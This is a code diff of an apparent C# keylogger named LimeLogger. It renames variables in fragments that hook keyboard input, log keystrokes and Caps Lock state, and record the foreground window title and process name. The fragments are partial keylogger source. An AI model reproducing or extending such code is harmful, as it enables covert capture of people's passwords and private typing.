@@ -41,10 +41,10 @@ namespace LimeLogger
             if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
             {
                 int vkCode = Marshal.ReadInt32(lParam);
-                bool CapsLock = (((ushort)GetKeyState(0x14)) & 0xffff) != 0;
+                bool capsLock = (((ushort)GetKeyState(0x14)) & 0xffff) != 0;
                 string currentKey;
 
-                if (CapsLock)
+                if (capsLock)
                 {
                     currentKey = KeyboardLayout((uint)vkCode).ToUpper();
                 }
@@ -91,7 +91,7 @@ namespace LimeLogger
                             currentKey = "[Tab]";
                             break;
                         case "Capital":
-                            if (CapsLock == true)
+                            if (capsLock == true)
                                 currentKey = "[CAPSLOCK: OFF]";
                             else
                                 currentKey = "[CAPSLOCK: ON]";
@@ -136,12 +136,12 @@ namespace LimeLogger
         private static string GetActiveWindowTitle()
         {
             const int nChars = 256;
-            StringBuilder Buff = new StringBuilder(nChars);
+            StringBuilder buffer = new StringBuilder(nChars);
             IntPtr handle = GetForegroundWindow();
 
-            if (GetWindowText(handle, Buff, nChars) > 0)
+            if (GetWindowText(handle, buffer, nChars) > 0)
             {
-                CurrentActiveWindowTitle = Path.GetFileName(Buff.ToString());
+                CurrentActiveWindowTitle = Path.GetFileName(buffer.ToString());
                 return CurrentActiveWindowTitle;
             }
             else
@@ -154,13 +154,13 @@ namespace LimeLogger
         {
             try
             {
-                string pName;
+                string processName;
                 IntPtr hwnd = GetForegroundWindow();
                 GetWindowThreadProcessId(hwnd, out uint pid);
                 Process p = Process.GetProcessById((int)pid);
-                pName = Path.GetFileName(p.MainModule.FileName);
+                processName = Path.GetFileName(p.MainModule.FileName);
 
-                return pName;
+                return processName;
             }
             catch (Exception)
             {
